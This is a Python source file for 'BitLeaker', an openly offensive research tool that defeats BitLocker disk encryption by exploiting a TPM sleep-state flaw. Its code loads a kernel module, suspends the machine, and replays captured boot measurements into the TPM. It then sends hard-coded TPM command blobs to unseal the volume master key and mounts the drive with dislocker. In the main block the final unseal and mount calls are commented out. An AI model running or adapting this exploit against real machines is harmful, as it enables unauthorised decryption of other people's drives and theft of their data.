#!/usr/bin/python3
#-*- coding: utf-8 -*-
#
#                           BitLeaker 
#                         ------------
#    Subverting Microsoft's BitLocker with One Vulnerability 
#
#               Copyright (C) 2019 Seunghun Han
#             at the Affiliated Institute of ETRI
#      Project link: https://github.com/kkamagui/bitleaker
#

import subprocess
import os
import sys
import re
from binascii import hexlify,unhexlify
from time import sleep


tpm_library_path = "LD_LIBRARY_PATH=tpm2-tools/src/.libs:TPM2.0-TSS/tcti/.libs:TPM2.0-TSS/sysapi/.libs"
dislocker_library_path = "LD_LIBRARY_PATH=dislocker/src"
#
# TPM data for unseal VMK of BitLocker
#
data_tpm2_load_header = [0x80, 0x02, 0x00, 0x00, 0x00, 0xf7, 0x00, 0x00, 0x01, 0x57, 0x81, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x40, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00]
data_tpm1_load_header = [0x80, 0x02, 0x00, 0x00, 0x00, 0xdf, 0x00, 0x00, 0x01, 0x57, 0x81, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x40, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00]
data_tpm2_startsession = [0x80, 0x01, 0x00, 0x00, 0x00, 0x3b, 0x00, 0x00, 0x01, 0x76, 0x40, 0x00, 0x00, 0x07, 0x40, 0x00, 0x00, 0x07, 0x00, 0x20, 0xe3, 0x4c, 0xe2, 0xd5, 0x48, 0x7f, 0x73, 0x97, 0xb2, 0x8d, 0xb4, 0xe7, 0x93, 0xde, 0x4c, 0x36, 0x91, 0x8a, 0xa5, 0x1f, 0x3b, 0x48, 0x0c, 0x1f, 0x7f, 0x75, 0x79, 0xc5, 0xee, 0xfa, 0xa9, 0x83, 0x00, 0x00, 0x01, 0x00, 0x10, 0x00, 0x0b]
data_tpm1_startsession = [0x80, 0x01, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x00, 0x01, 0x76, 0x40, 0x00, 0x00, 0x07, 0x40, 0x00, 0x00, 0x07, 0x00, 0x14, 0x30, 0xb9, 0xbd, 0x22, 0x3d, 0x3c, 0x38, 0x95, 0x3d, 0x85, 0x9c, 0xf1, 0x3b, 0xf7, 0xcb, 0xca, 0x88, 0x7a, 0x26, 0x49, 0x00, 0x00, 0x01, 0x00, 0x10, 0x00, 0x04]
data_tpm2_policyauthorize = [0x80, 0x01, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x01, 0x6b, 0x03, 0x00, 0x00, 0x00]
data_tpm1_policyauthorize = [0x80, 0x01, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x01, 0x6b, 0x03, 0x00, 0x00, 0x00]
data_tpm2_pcrpolicy_header = [0x80, 0x01, 0x00, 0x00, 0x00, 0x3a, 0x00, 0x00, 0x01, 0x7f, 0x03, 0x00, 0x00, 0x00]
data_tpm1_pcrpolicy_header = [0x80, 0x01, 0x00, 0x00, 0x00, 0x2e, 0x00, 0x00, 0x01, 0x7f, 0x03, 0x00, 0x00, 0x00]
data_tpm2_pcrpolicy_subheader = [0x00, 0x00, 0x00, 0x01, 0x00, 0x0b]
data_tpm1_pcrpolicy_subheader = [0x00, 0x00, 0x00, 0x01, 0x00, 0x04]
data_tpm2_unseal = [0x80, 0x02, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x00, 0x01, 0x5e, 0x80, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
data_tpm1_unseal = [0x80, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x01, 0x5e, 0x80, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]

# SHA256 of bootmgfw.efi certificate, it is used for PCR #7
sha256_bootmgfw_cert = '30bf464ee37f1bc0c7b1a5bf25eced275347c3ab1492d5623ae9f7663be07dd5'
#sha1_bootmgfw_cert = '8b4866854c0b829dd967a1d9f100a3920d412792'
#sha1_bootmgfw_cert = '8cfba0f34dda0f98ba4acec8e609a5f0a2b426b3'
sha1_bootmgfw_cert = '9fc713b7248d99a1a0db3d50c14eb9b4ff270721'

#
# Color codes
#
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
MAGENTA = '\033[1;35m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
BLINK = '\033[5m'
SUCCESS = GREEN
FAIL = RED
filename = 'key.txt'

#
# Print colored message
#
def color_print(message, color):
    sys.stdout.write(color + message + ENDC)
    return

def info_print(message):
    color_print(message, BOLD)

#
# Show a banner.
#
def show_banner():
    banner = """\
                                                ,║▒▒▒▒▒▒@╖
                                               ╥▒▒╝    ▒▒▒╢
                                              ]▒▒╢      ]▒▒╢
                                              ]▒▒▒      j▒▒╢
                          ,                 ,╖║▒▒▒
            ,╓╖,  ╓@╬@╥╥╬╣╢╢▓▓            ╖▒╖▒╙▒▒▒░░░▒░▒▒▒▒.
        ║╬@▓╢╢╢╢╢ ╢╢╢╢╢╢╢╢╢╢╢╢[           ╜╜╜╢╢▒▒░░░░░░▒@▓▓▄▒▒▒▒╖
        ╢╢╢╢╢╢╢╢╢ ╢╢╢╢╢╢╢╢╢╢╢╢[           ░░░░░╙╢▓╣╬▓▓@@▓▓@░░æ▓▓▓[
        ╢╢╢╢╢╢╢╢╢ ╢╢╢╢╢╢╢╢╢╢..[           ░░░░░ ░▒▒▒▒▒▒▒▒▒▒▓▓▓▒▒▒H
        ╢                    ╢`           ░░░░░░░▒▒▒▒▒▒▒▒▒▒╢▒▒╢╢╢[
        ..╢╢╢╢╢╢╢ ╢╢╢╢╢╢╢╢╢╢╢╢            ░░░░░░░▒▒▒▒▒▒▒▒▒▒╢╢╢╢╢╢[
        ╢╢╢╢╢╢╢╢╢ ╢╢╢╢╢╢╢╢╢╢╢╢[      ¿░░░,░░░░░░░▒▒▒▒▒▒▒▒▒▒╢╢╢╢╢╢[
        ╢╢╢╢╢╢╢╢╢ ╢╢╢╢╢╢╢╢╢╢╢╢░░░░░░░░░░░░╣▓▓@░░░▒▒▒▒▒▒▒▒▒▒╫╣╣╣▓▓[
          ╙╙   ╙╬ ╨╜╙╬╢╢╢╣╣╢╢╢░░░░░░░░░░░░░░░░╫▓@▓▓▓▒▒▒▒▒▒▒▓▓▓▓▓▓[
             ,,, ,░░░░░░░░░░╙╨░░░░░░░░░░░░░░░░░░▓▒▒▒▓▓▓▓▓▓▓▓▓▓▓▀"`
        ,,.░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░]▒░░░╙╢▒▓╣▓▒▒▒▒  ]
        ▐▓█████▄░░░░▒░░░░░░░░░░░░░░░░░░░░░░░░░░╟▒▒▒▒▒▒▒▒▒╣▓╢╢╢ ░░
        ▐▓▓██████████▄░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▓╢▒▒▒▒╢▓╢╢▒┌░░
        ▐▓▓█████████████████▄░░░▒▒░░▒▒▒▒▒▒▒╢╢╢╢╢╢Ñ▒▒▓╢▒▒▒▒▓╣╢╜▒░░
        ╜▓▓██▀████████████████▌║▒▒▒▒╢╢╢╢╣╢╢╢╣╣╣╣╣╣╣╝╣▒▒╢▓"    ▒░░
        ` "╙``╙╣▀█▀▀██████████▌╢╢╢╢╢╢╢╣╣╣╣╣╢Ñ╜╨Ñ╝`    ╙  ,,   ▒▒▒
                 "` "╨╢▀▀▓▓███▌╢╣╣╣╣╣╣╜╜╨╨╜      ▄, ░░   ,▌ ░░▒▒▒
         ░   e             ╙╣▓▌Ñ╜╙╙╜`            ▌▓ ░░░  ░░░░░▒▒▒
         ░░░░╧╤░░░    ,       ,         ▐░ ░░░░  ░░░░░░░░█▐░▒░▒▒▒
         ░░░░,░░░░░░  ▐,     j▌█    ░ ░░░░░░░░░░░▐░░▒░░░░░░░▒░▒▒▒
         ░░░░▌█░░░░░░░░░░░░ ░░░░░░░░░░░░╪░░░░░░░░░░░▒░░▒░▒▌▒▒▒▒▒▒`
        ▒▒▒▒░▒▒▒▒▒▒░░æ▄▒░▒▒░░æ▄▒▒▒▒▒▒▒▒▌▓▒▒▒▒▒▒▒æ▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒
        ]▒▒▒▒░▒▒▒▒▒▒▒▒╬▒▒▒▒▒▒▒╬▒▒▒▒▒▒▒▒▒▐▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░
        └ ▒░░▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒]▒░▒▒░▒░▒▒▒░▒▒▒░░░ ░░░; ░░
          ▒░░▒▒░▒║░▒▒▒▒▒▒░▒▒▒▒▒░▒]▒▒]░░▒▒░░ ░░▒░▒░▒░░  ░░ ⌡  ░
          ░ ░░▒░▒] ░░▒░▒░░▒▒░]░░▒;▒▒]░░░░ ░ ░░j░░░▒░   ░  !
            ░▒L░░└   ░░  ░▒ ░ ░░▒!▒▒ ░ ░  ░ ░░└ ░ ▒
             ▒L░       ░▒  ░ ░      ░ ░ ░ └ ░

""" + \
    GREEN +'    BitLeaker v1.0 for decrypting BitLocker with the TPM vulnerability\n' + ENDC + \
    '             Made by Seunghun Han, https://kkamagui.github.io\n' + \
    '           Project link: https://github.com/kkamagui/bitleaker \n'
    print(banner)

#
# Prepare PCR data from dmesg
#
def prepare_pcr_data():
    """
    [   27.955579] bitleaker: Virt FFFFAF80C55E0000 Phys 80000
    [   27.955582] bitleaker: evet_version = 2
    [   27.955588] bitleaker: TCG_PCR_EVENT size 36 TCG_PCR_EVENT2 size 12
    [   27.955595] bitleaker: Start 0x6f484000, End 0x6f48ebd5, Trunc 0
    [   27.955610] bitleaker: [1] PCR 0, Event 7, SHA256= 31 37 22 f6 4f 2a 08 57 c6 01 26 6c 89 bf 21 70 0a 7c 4e 79 dc 96 76 4c 2a 35 55 68 2a 3c 7b 7a 
    [   27.955627] bitleaker: [2] PCR 0, Event 8, SHA256= d4 72 0b 40 09 43 82 13 b8 03 56 80 17 f9 03 09 3f 6b ea 8a b4 7d 28 3d b3 2b 6e ab ed bb f1 55 
    [   27.955642] bitleaker: [3] PCR 0, Event 1, SHA256= db e1 4c 63 b7 d0 be dd 3f aa 9d b8 8f 9c 34 ad 75 a6 91 f7 c0 17 7f 70 1e ee 59 5d 44 d9 62 bc 
    [   27.955661] bitleaker: [4] PCR 7, Event 80000001, SHA256= cc fc 4b b3 28 88 a3 45 bc 8a ea da ba 55 2b 62 7d 99 34 8c 76 76 81 ab 31 41 f5 b0 1e 40 a4 0e 
    [   27.955678] bitleaker: [5] PCR 7, Event 80000001, SHA256= 78 68 42 98 cc 54 cf 75 50 bd 38 d3 c3 78 ee ee 59 d3 ae 02 76 32 cd a6 f5 07 ac 5c cd 25 7b 35 
    ... omitted ...
    [   27.957613] bitleaker: == End of Data ==
    """
    info_print('Loading BitLeaker kernel module... ')
    #subprocess.getoutput('sudo insmod bitleaker-kernel-module/bitleaker-kernel-module.ko')
    #subprocess.getoutput('sudo insmod bitleaker-kernel-module/bitleaker-kernel-module-5.3.ko')
    subprocess.getoutput('sudo modprobe bitleaker-kernel-module')
    color_print('Success\n', SUCCESS)
    
    info_print('Entering sleep...\n')
    info_print('    [>>] Please press any key or power button to wake up...')
    input('')
    subprocess.getoutput('systemctl suspend')
    info_print('Waking up...\n')
    info_print('    [>>] Please press any key to continue...')
    input('')
    info_print('\n')

    info_print('Preparing PCR data.\n')
    info_print('    [>>] Get PCR data from BitLeaker driver... '),
    output = subprocess.getoutput('sudo dmesg').split('\n')

    first_marker_found = 0
    second_marker_found = 0
    raw_data = []
    for line in output:
        if 'Dump event logs' in line:
            first_marker_found = 1

        if first_marker_found == 1 and 'SHA1' in line:
            second_marker_found = 1

        if second_marker_found == 1 and 'End of Data' in line:
            break

        if second_marker_found == 1:
            raw_data.append(line)
    
    if len(raw_data) == 0:
        color_print('Fail\n', FAIL)
        sys.exit(-1)
    color_print('Success\n\n', SUCCESS)

    return raw_data

def read_canned_pcr_data(filename):
    f = open(filename, 'r')
    output = f.readlines()
    f.close()

    first_marker_found = 0
    second_marker_found = 0
    raw_data = []
    for line in output:
        if 'Dump event logs' in line:
            first_marker_found = 1

        if first_marker_found == 1 and 'SHA1' in line:
            second_marker_found = 1

        if second_marker_found == 1 and 'End of Data' in line:
            break

        if second_marker_found == 1:
            raw_data.append(line)
    
    info_print('Entering sleep...\n')
    info_print('    [>>] Please press any key or power button to wake up...')
    input('')
    subprocess.getoutput('systemctl suspend')
    info_print('Waking up...\n')
    info_print('    [>>] Please press any key to continue...')
    input('')
    info_print('\n')

    if len(raw_data) == 0:
        color_print('Fail\n', FAIL)
        sys.exit(-1)
    color_print('Success\n\n', SUCCESS)

    return raw_data
    

#
# Cut PCR data and extract pcr_list
#
def cut_and_extract_essential_pcr_data(raw_data):
    """
    [   27.955610] bitleaker: [1] PCR 0, Event 7, SHA256= 31 37 22 f6 4f 2a 08 57 c6 01 26 6c 89 bf 21 70 0a 7c 4e 79 dc 96 76 4c 2a 35 55 68 2a 3c 7b 7a 
    """
    info_print('Cut and extract essential PCR data.\n')
   
    extracted_raw_data = []
    ev_separator_found = 0
    for line in raw_data:
        #if ev_separator_found == 1 and 'PCR 7' in line:
        #    break
        
        if 'Event 80000003' in line:
            break
 
        extracted_raw_data.append(line)

    info_print('    [>>] Extract PCR numbers and SHA1 hashes... ')
    
    # Extract PCR numbers and SHA1 hashes
    pcr_list = []
    for line in extracted_raw_data:
        # PCR number
        match = re.search(r'\d+?,', line)
        pcr_num = match.group(0).replace(',', ' ')
        
        # SHA 1
        match = re.search(r'(?<=SHA1=).*', line)
        sha1 = match.group(0).replace(' ', '')

        pcr_list.append([pcr_num, sha1])

    if len(pcr_list) != 0:
        color_print('Success\n\n', SUCCESS)
    else:
        color_print('Fail\n\n', FAIL)
        sys.exit(-1)

    info_print('    [>>] Stored list:\n')
    print(pcr_list)
    return pcr_list

#
# Check resource manager is running and run it
#
def check_and_run_resource_manager():
    info_print('    [>>] Checking the resource manager process... ')
    sys.stdout.flush()

    output = subprocess.getoutput('sudo ps -e | grep resourcemgr')
    if 'resourcemgr' in output:
        color_print('Running\n', SUCCESS)
        return 0

    pid = os.fork()
    if pid == 0:
        subprocess.getoutput('sudo %s TPM2.0-TSS/resourcemgr/resourcemgr > /dev/null' % (tpm_library_path))
        sys.exit(0)
    else:
        # Wait for the resource manager
        resourcemgr_found = False

        for i in range(0, 10):
            output = subprocess.getoutput('ps -e | grep resourcemgr')
            if len(output) != 0:
                resourcemgr_found = True
                break

            sleep(1)

        if resourcemgr_found == False:
            color_print('Fail\n', FAIL)
            sys.exit(-1)

    color_print('Success\n', SUCCESS)
    sleep(3)
    return 0

#
# Replay PCR data to the TPM
#
def replay_pcr_data(pcr_list):
    info_print('Replay TPM data.\n')
    check_and_run_resource_manager()

    output = subprocess.getoutput('%s tpm2-tools/src/tpm2_listpcrs -g 0x04' % (tpm_library_path))
    print(output + '\n')
    for pcr_data in pcr_list:
        info_print('    [>>] PCR %s, SHA1 = %s\n' % (pcr_data[0], pcr_data[1]))
        output = subprocess.getoutput('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P %s -i %s' % (tpm_library_path, pcr_data[0], pcr_data[1]))
        print(output + '\n')

    # Last one for PCR #7
    info_print('    [>>] Last PCR 7, SHA1 = %s\n' % (sha1_bootmgfw_cert))
    #info_print('    [>>] Last PCR 7, SHA1 = %s\n' % (sha256_bootmgfw_cert))
    #output = subprocess.getoutput('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P 4 -i %s' % (tpm_library_path, 'dbacc822c8778d9b40b862daf318cf718757123b'))
    #print(output + '\n')
    output = subprocess.getoutput('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P 7 -i %s' % (tpm_library_path, sha1_bootmgfw_cert))
    print(output + '\n')
    #output = subprocess.getoutput('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P 4 -i %s' % (tpm_library_path, 'dbacc822c8778d9b40b862daf318cf718757123b'))
    #print(output + '\n')
    #output = subprocess.getoutput('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P 11 -i %s' % (tpm_library_path, '5497b0911b3f5772723def3b360a2e654327c19b'))
    #print(output + '\n')
    #output = subprocess.getoutput('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P 11 -i %s' % (tpm_library_path, '3a4072cc6b77e2639d4fdc91c91efc11bc3e33c3'))
    #print(output + '\n')

    output = subprocess.getoutput('%s tpm2-tools/src/tpm2_listpcrs -g 0x04' % (tpm_library_path))
    print(output + '\n')

#    os.system('sudo killall resourcemgr')
    
# 
# Extract TPM encoded blob from Dislocker tool
#
def get_raw_tpm_encoded_blob_from_dislocker(drive_path):
    """
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000000 00 8a 00 20 17 a4 c4 51-c1 ee 18 52 89 b0 e3 ac
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000010 39 65 f7 32 25 5b 87 ac-31 14 ed 1a 99 ac 62 4c
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000020 b2 90 b5 c1 00 10 8c cf-34 58 f5 1a 18 04 f9 2e
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000030 62 fa e3 93 a0 d1 ce 1f-49 99 9b ac 6d e8 27 97
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000040 c9 f9 c2 20 aa e7 23 1f-7c 68 1e 7e 74 65 c6 89
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000050 d9 f2 94 15 51 0f a1 8a-64 ae f6 c0 01 bb 8b 67
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000060 0a 2d 3b 65 15 f1 62 51-2d 8b 61 0d 8b 98 3f 76
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000070 b3 3f 64 7a 12 59 74 bb-60 e5 ad 5e 61 a1 31 3c
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000080 f9 90 17 6c fe 07 eb 49-20 69 55 66 00 4e 00 08
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000090 00 0b 00 00 04 12 00 20-6f b5 05 0c 0a 64 e6 ff
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000a0 2e 0a f1 8e 9c d8 26 40-87 44 b0 f2 08 4a bc a9
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000b0 c7 cd 7e 72 17 de cc f0-00 10 00 20 3d c3 40 aa
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000c0 98 5b 5b 48 50 9e 71 c2-19 03 0a bc bd 95 a6 10
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000d0 22 12 2d e3 e6 50 63 79-af f1 3c c4 00 20 5f f5
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000e0 9b 8f b8 7c 48 dc 43 68-60 eb a2 70 cc a2 22 4e
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000f0 7b b9 f0 83 ed fe 78 91-fa ed e2 b4 de 5a 03 80
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000100 08 00
    """
    # Run Dislocker with debug mode
    print("Library path: %s, drive_path %s\n" % (dislocker_library_path,drive_path))
    output = subprocess.getoutput('sudo %s dislocker/src/dislocker-metadata -v -v -v -v -V %s' % (dislocker_library_path, drive_path)).split('\n')
    print("output = %s" % (output))

    first_marker_found = 0
    second_marker_found = 0
    raw_data = []
    for line in output:
        if 'TPM_ENCODED' in line:
            first_marker_found = 1

        if first_marker_found == 1 and '0x00000000' in line:
            second_marker_found = 1

        if second_marker_found == 1 and not '0x000000' in line:
            break

        if second_marker_found == 1:
            raw_data.append(line[44:])

    return raw_data

#
# Extract private/public data and PCR policy 
#
def extract_priv_pub_and_pcr_policy_from_raw_blob(raw_tpm_blob):
    print("RAW TPM BLOB: ",end='')
    print(raw_tpm_blob)
    hex_data = []
    for line in raw_tpm_blob:
        line = line.replace('-', ' ')
        line = line.replace('  ', ' ')
        data_list = line.split(' ')
        hex_data = hex_data + data_list[:-1]

    hex_data = hex_data[:]

    print("hex_data:",end="")
    print(hex_data)
    priv_pub = [int(hex_data[i], 16) for i in range(0, 0xc4)]
    pcr_policy = [int(hex_data[i], 16) for i in range(0xc4, len(hex_data) - 1)]
    return(priv_pub, pcr_policy)

#
# Prepare TPM data for unsealing VMK of BitLocker
#
def prepare_tpm_data(drive_path):
    info_print('Preparing TPM data.\n')
    info_print('    [>>] Get TPM-encoded blob from dislocker... ')
    raw_data_list = get_raw_tpm_encoded_blob_from_dislocker(drive_path)
    if raw_data_list == []:
        print('BitLeaker: Error. %s is not BitLocker-locked partition\n' % drive_path)
        sys.exit(-1)
    color_print('Success\n', SUCCESS)

    info_print('    [>>] Convert TPM-encoded blob to hex data... ')
    hex_priv_pub, pcr_policy = extract_priv_pub_and_pcr_policy_from_raw_blob(raw_data_list)
    color_print('Success\n', SUCCESS)
    info_print('    [>>] raw_data_list:\n%s,%d\n' % (raw_data_list, len(raw_data_list)))
    info_print('    [>>] hex_priv:\n%s,%d\n' % (hex_priv_pub, len(hex_priv_pub)))
    info_print('    [>>] pcr_policy:\n%s,%d\n' % (pcr_policy, len(pcr_policy)))

    # Prepare TPM1_Load data
    info_print('    [>>] Create TPM1_Load data... ')
    data = data_tpm1_load_header + hex_priv_pub
    file = open('tpm1_load.bin', 'wb')
    file.write(bytearray(data))
    file.close()
    color_print('Success\n', SUCCESS)

    # Prepare TPM1_StartSession data
    info_print('    [>>] Create TPM1_StartSession data... ')
    data = data_tpm1_startsession
    file = open('tpm1_startsession.bin', 'wb')
    file.write(bytearray(data))
    file.close()
    color_print('Success\n', SUCCESS)

    # Prepare TPM1_PolicyAuthorize data
    info_print('    [>>] Create TPM1_PolicyAuthorize data... ')
    data = data_tpm1_policyauthorize
    file = open('tpm1_policyauthorize.bin', 'wb')
    file.write(bytearray(data))
    file.close()
    color_print('Success\n', SUCCESS)

    # Prepare TPM1_PCRPolicy data
    info_print('    [>>] Create TPM1_PolicyPCR data... ')
    data1 = data_tpm1_pcrpolicy_header + pcr_policy[:len(pcr_policy) - 4]
    data2 = data_tpm1_pcrpolicy_subheader + pcr_policy[len(pcr_policy) - 4:]
    file = open('tpm1_policypcr.bin', 'wb')
    file.write(bytearray(data1))
    file.write(bytearray(data2))
    file.close()
    color_print('Success\n', SUCCESS)

    # Prepare TPM1_Unseal data
    info_print('    [>>] Create TPM1_Unseal data... ')
    data = data_tpm1_unseal
    file = open('tpm1_unseal.bin', 'wb')
    file.write(bytearray(data))
    file.close()
    color_print('Success\n\n', SUCCESS)

#
# Execute TPM1 command data for unsealing VMK 
#
def execute_tpm_cmd_and_extract_vmk():
    info_print('Execute TPM commands\n')
    
    # Execute TPM1_Load command 
    info_print('    [>>] Execute TPM1_Load... ')
#    check_and_run_resource_manager()
    #output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_load.bin' % tpm_library_path)
    output = subprocess.getoutput('sudo %s ./tpm2-tools/src/tpm2_loadexternal -H n -u pubkey.bin -r privkey.bin' % tpm_library_path)
    print(output)
    if 'Fail' in output:
        color_print('    [>>] Fail\n\n', FAIL)
        sys.exit(-1)
    color_print('    [>>] Success\n\n', SUCCESS)
    sleep(2)

    # Execute TPM1_StartSession command 
    info_print('    [>>] Execute TPM1_StartSession... ')
    output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_startsession.bin' % tpm_library_path)
    print(output)
    if 'Fail' in output:
        color_print('    [>>] Fail\n\n', FAIL)
        sys.exit(-1)
    color_print('    [>>] Success\n\n', SUCCESS)
    sleep(2)

    # Execute TPM1_PolicyAuthorize command 
    info_print('    [>>] Execute TPM1_PolicyAuthorize... ')
    output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_policyauthorize.bin' % tpm_library_path)
    print(output)
    if 'Fail' in output:
        color_print('    [>>] Fail\n\n', FAIL)
        sys.exit(-1)
    color_print('    [>>] Success\n\n', SUCCESS)
    sleep(2)

    # Execute TPM1_PolicyPCR command 
    info_print('    [>>] Execute TPM1_PolicyPCR... ')
    output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_policypcr.bin' % tpm_library_path)
    print(output)
    if 'Fail' in output:
        color_print('    [>>] Fail\n\n', FAIL)
        sys.exit(-1)
    color_print('    [>>] Success\n\n', SUCCESS)
    sleep(2)

    # Execute TPM1_Unseal command 
    info_print('    [>>] Execute TPM1_Unseal... ')
    output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_unseal.bin' % tpm_library_path)
    print(output)
    if 'Fail' in output:
        color_print('    [>>] Fail\n\n', FAIL)
        sys.exit(-1)
        sys.exit(-1)
    color_print('    [>>] Success\n\n', SUCCESS)
    sleep(2)

    # Extract VMK from TPM result
    vmk_data = extract_vmk_from_tpm_result(output.split('\n'))
    return vmk_data

#
# Extract VMK from TPM result
#
def extract_vmk_from_tpm_result(tpm_output):
    """
    [>>] Execute TPM1_Unseal... Input file tpm1_unseal.bin
Initializing Local Device TCTI Interface
    [>>] Input Size 27
00000000  80 02 00 00 00 1b 00 00  01 5e 80 00 00 01 00 00  |.........^......|
00000010  00 09 03 00 00 00 00 00  00 00 00                 |...........|

    [>>] Output Size 97, Result: Success
00000000  80 02 00 00 00 61 00 00  00 00 00 00 00 2e 00 2c  |.....a.........,|
00000010  2c 00 05 00 01 00 00 00  03 20 00 00 88 2e b7 28  |,........ .....(|
00000020  33 cd 21 05 f5 38 ea 60  89 51 62 e8 61 5b 0c ed  |3.!..8.`.Qb.a[..|
00000030  6a 63 7e f9 17 83 55 e9  0f 70 95 09 00 20 df e3  |jc~...U..p... ..|
00000040  75 69 1f e8 30 33 ef 3f  10 49 e3 53 de 18 e4 f1  |ui..03.?.I.S....|
00000050  0c e2 18 dd 7c bf ab 1d  6d 63 38 ec d1 f3 00 00  |....|...mc8.....|
00000060  00                                                |.|
Success
    """
    output_found = 0
    vmk_data = []
    for line in tpm_output:
        if 'Output Size' in line:
            output_found = 1
            continue

            if not 'Success' in line:
                return []

        if output_found == 1 and not '0000' in line:
            break
       
        if output_found == 1:
            data = line.split('|')
            data = data[0].split()
            vmk_data = vmk_data + data[1:17]

    vmk_data = [int(vmk_data[i], 16) for i in range(28, 60)]
    return vmk_data

#
# Mount BitLocker-locked partition with the VMK
#
def mount_bitlocker_partition_with_vmk(drive_path, vmk_data):
    info_print('Mount BitLocker-locked Partition with VMK.\n')

    # Print VMK
    color_print('    [>>] VMK = ', GREEN)
    for hex in vmk_data:
        color_print('%02X'% hex, GREEN)
    info_print('\n')

    # Prepare TPM2_Load data
    info_print('    [>>] Create VMK data... ')
    file = open('vmk.bin', 'wb')
    file.write(bytearray(vmk_data))
    file.close()
    color_print('Success\n', SUCCESS)

    # Mount BitLocker-locked partition
    subprocess.getoutput('mkdir windows')
    info_print('    [>>] Mount BitLocker-Locked partition(%s)...\n\n' % drive_path)
    output = subprocess.getoutput('sudo dislocker -v -v -v -V %s -K vmk.bin -- ./windows' % drive_path)
    print(output)
    output = subprocess.getoutput('sudo mount -o loop ./windows/dislocker-file ./windows')

#   
# Main
#
if __name__ == '__main__':
    # Show a banner
    show_banner()

    # Searching for BitLocker-locked partitions
    info_print('Search for BitLocker-locked partitions.\n')

    if len(sys.argv) != 2:
        output = subprocess.getoutput('sudo fdisk -l 2>/dev/null | grep "Microsoft basic data"').split('\n')
        if len(output) == 0:
            color_print('    [>>] BitLocker-locked partition is not found.\n', FAIL)
            info_print('    [>>] Please try with the explicit drive path. ./bitleaker.py <drive path>\n')
            sys.exit(-1)

        drive_path = output[0].split(' ')[0]
    else:
        drive_path = sys.argv[1]

    info_print('    [>>] BitLocker-locked partition is [%s]\n\n' % drive_path)

    # Prepare PCR data
    #raw_data = read_canned_pcr_data("bitleaker-data.txt")
    raw_data = prepare_pcr_data()
    pcr_list = cut_and_extract_essential_pcr_data(raw_data)
    replay_pcr_data(pcr_list)

    # Prepare TPM data and extract VMK
    ##f = open(filename,'wb')
    ##prepare_tpm_data(drive_path)
    ##vmk_data = execute_tpm_cmd_and_extract_vmk()
    ##f.write(hexlify(bytearray(vmk_data)))
    ##f.close()
    os.system('sudo killall resourcemgr')
    
   
#    # Mount BitLocker-locked partition with VMK
#    mount_bitlocker_partition_with_vmk(drive_path, vmk_data)

